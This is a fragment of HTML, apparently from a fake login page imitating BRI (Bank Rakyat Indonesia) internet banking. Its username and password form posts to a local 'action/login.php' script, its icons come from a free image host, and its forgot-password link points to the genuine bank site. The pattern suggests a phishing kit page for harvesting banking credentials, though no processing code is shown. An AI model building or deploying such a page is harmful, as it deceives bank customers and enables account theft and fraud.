...
<html lang="en">
  ...
  <body>
    <div class="container">
        <div class="row">
            <div class="col-12 d-block mx-auto text-center p-0" style="height: 350px; width: 536px; max-width: 100%; margin-top: -5px; border-radius: 0px;">
            ...
            <form action="../action/login.php" method="POST">
                <div class="row mb-3">
                    <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -20px auto;">
                        <div>
                            <img src="https://i.ibb.co/W23BgRK/people-icon.png" width="28" style="position: absolute; margin-top: 15px; margin-left: 10px;" alt="">
                            <input name="username" id="user" type="text" class="bubble-element Input form-log" tabindex="1" placeholder="Username" maxlength="" required>
                        </div>
                        <div style="margin-top: 1px">
                            <img src="https://i.ibb.co/qDp7czv/pw-icon.png" width="28" style="position: absolute; margin-top: 9px; margin-left: 10px;" alt="">
                            <input type="password" name="password" id="password" class="bubble-element Input form-log" tabindex="1" placeholder="Password" maxlength="" required>
                        ...
                        <div class="text-header" style="float: right; position: relative; z-index: 999; display: block; margin-top: 15px;"><font  style="font-size: 14px" color="#000000"><strong><a href="https://ib.bri.co.id/ib-bri/id/forget-password.html" target="_blank" style="color: #000; text-decoration: none;">Lupa Password?</a></strong></font></div>
                    </div>
                </div>
                <div class="row mt-3">
                    <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -20px auto;">
